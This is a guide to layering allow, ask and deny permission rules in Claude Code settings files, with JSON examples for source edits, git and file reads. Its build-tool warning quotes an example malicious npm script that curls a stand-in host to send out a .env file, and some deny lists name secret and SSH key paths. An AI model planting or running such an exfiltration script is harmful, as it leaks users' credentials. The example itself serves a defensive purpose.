# Layering Permissions

A permission layering strategy uses **broad allow rules** as a baseline, then **narrows down** with specific ask and deny rules. This leverages the precedence system (Deny > Ask > Allow) to create flexible, maintainable configurations.

## How It Works

Instead of listing every allowed operation explicitly, you:

1. **Start broad** - Allow a wide category of operations
1. **Carve out review points** - Use `ask` for operations needing approval
1. **Block exceptions** - Use `deny` for operations that should never happen

The precedence system ensures that more specific ask/deny rules override the broad allow.

## Core Example: Source Code Editing

```json
{
  "allow": ["Edit(src/**)"],             // Broad: Edit all source files
  "ask": [
    "Edit(src/**/config/**)",            // Narrow: Ask for config files
    "Edit(src/**/*.sql)"                 // Narrow: Ask for SQL files
  ],
  "deny": ["Edit(src/generated/**)"]     // Narrower: Never edit generated code
}
```

**How it works:**

1. **Baseline**: `Edit(src/**)` allows editing any file in `src/`
1. **Review layer**: Config files and SQL require confirmation before editing
1. **Block layer**: Generated code is blocked entirely (would be overwritten by codegen)

**Result**: Claude can freely edit source code, but you get visibility into critical changes (configs, SQL) and protection from wasteful edits (generated files).

**Why this works**: When Claude tries to edit `src/config/database.js`:

- Matches `Edit(src/**)` → would allow
- Also matches `Edit(src/**/config/**)` → ask wins over allow
- Result: User is prompted to review

## Additional Examples

### Git Commands

```json
{
  "allow": ["Bash(git:*)"],              // Broad: All git commands
  "ask": ["Bash(git push:*)"],           // Narrow: Ask before pushing
  "deny": ["Bash(git push --force:*)"]   // Narrower: Never force push
}
```

**Behavior**:

- `git status`, `git diff`, `git commit` → Allowed automatically
- `git push` → Requires confirmation
- `git push --force` → Blocked entirely

## When to Use Layering

### ✅ Use Layering When:

1. **You have natural categories** - "all git commands", "all source files", "all file reads"
1. **Most operations are safe** - The broad allow covers routine work
1. **Exceptions are clear** - A few specific operations need different treatment
1. **You want maintainability** - Easier than dozens of specific rules

### ❌ Don't Use Layering When:

1. **Security is the goal** - Use hooks for protecting secrets, not deny rules
1. **No clear baseline** - Operations are too varied for a broad allow
1. **Everything needs review** - Just use specific allows or asks
1. **Build tools** - Never use broad wildcards like `Bash(npm:*)` or `Bash(make:*)` (see warning below)

## ⚠️ Critical Warning: Build Tools

**NEVER use layering with build tools** like npm, make, gradle, cargo, etc.

### Why This Is Dangerous

Build tools execute scripts defined in configuration files. A broad allow like `Bash(npm:*)` or `Bash(make:*)` creates an **arbitrary code execution vulnerability**:

```json
// ❌ EXTREMELY DANGEROUS
{
  "allow": [
    "Bash(npm:*)",              // Executes ANY script
    "Edit(package.json)"        // Can add malicious scripts
  ]
}

// ❌ STILL DANGEROUS - Even with "ask"
{
  "allow": ["Bash(npm:*)"],     // Broad wildcard
  "ask": ["Edit(package.json)"] // Ask doesn't prevent the risk
}
```

**The attack:**

1. Config file gets modified (even with user approval of the edit)
1. Malicious script added: `"steal": "curl evil.com --data @.env"`
1. Broad wildcard permission allows immediate execution
1. No additional review required

### Safe Alternative for Build Tools

Use **specific allows** instead of wildcards:

```json
// ✅ SAFE: Specific commands only
{
  "allow": [
    "Bash(npm run test)",       // Specific script you've reviewed
    "Bash(npm run build)",      // Specific script you've reviewed
    "Bash(make test)"           // Specific script you've reviewed
  ],
  "ask": [
    "Bash(npm install:*)",      // Review dependency changes
    "Edit(package.json)"        // Review config changes
  ]
}
```

See **[build-tool-permissions.md](build-tool-permissions.md)** for complete guidance on safely configuring build tools.

## Common Patterns

### Pattern 1: Git Operations with Safety Rails

```json
{
  "allow": [
    "Bash(git:*)",                       // Use git freely
    "Edit(src/**)"                       // Edit code freely
  ],
  "ask": [
    "Bash(git push:*)",                  // Review before pushing
    "Edit(src/**/config/**)"             // Review config changes
  ],
  "deny": [
    "Bash(git push --force:*)",          // Never force push
    "Edit(src/generated/**)"             // Block generated files
  ]
}
```

### Pattern 2: Token-Conscious Reading

```json
{
  "allow": ["Read(**)"],                 // Read broadly
  "ask": ["Read(**/*.log)"],             // Ask for logs (often large)
  "deny": [
    "Read(node_modules/**)",             // Block dependencies
    "Read(dist/**)",                     // Block build output
    "Read(**/*.min.js)"                  // Block minified files
  ]
}
```

### Pattern 3: Multi-Tool File Management

```json
{
  "allow": [
    "Read(**)",                          // Read broadly
    "Edit(src/**)",                      // Edit source freely
    "Glob(**)"                           // Search freely
  ],
  "ask": [
    "Edit(package.json)",                // Review important files
    "Edit(tsconfig.json)",
    "Edit(Dockerfile)"
  ],
  "deny": [
    "Read(**/.env)",                     // Block secrets
    "Edit(src/generated/**)",            // Block generated code
    "Write(src/**)"                      // Prefer Edit over Write
  ]
}
```

## Combining with Configuration Hierarchy

Layering works well across configuration levels:

**User global settings** (`~/.claude/settings.json`):

```json
{
  "allow": [
    "Read(**)",                          // Read broadly by default
    "Edit(**)"                           // Edit broadly by default
  ],
  "deny": [
    "Read(**/.env)",                     // Always block secrets
    "Read(~/.ssh/**)"                    // Always block SSH keys
  ]
}
```

**Project settings** (`.claude/settings.json`):

```json
{
  "ask": [
    "Edit(package.json)",                // Project-specific: review this
    "Edit(src/**/config/**)"             // Project-specific: review configs
  ],
  "deny": [
    "Edit(src/generated/**)"             // Project-specific: block generated
  ]
}
```

**Result**: Global defaults provide baseline safety, project settings add specific controls.

## Key Principles

1. **Broad baseline enables workflow** - Don't make routine work difficult
1. **Specific exceptions add control** - Target what actually matters
1. **Precedence is your friend** - Deny > Ask > Allow makes layering work
1. **Maintainability matters** - One broad rule beats dozens of specific ones
1. **Iterate based on usage** - Start simple, add layers as needed

## Summary

**Layering formula:**

1. Identify a broad category (`Edit(src/**)`, `Bash(git:*)`)
1. Allow it as baseline
1. Add ask rules for operations needing review
1. Add deny rules for operations that should never happen

**Benefits:**

- Fewer rules to maintain
- Clear exceptions highlight what's important
- Natural workflow (permissive baseline, targeted controls)
- Easy to evolve as project needs change

**Remember**:

- Layering is for workflow efficiency, NOT security
- For protecting secrets, use hooks instead
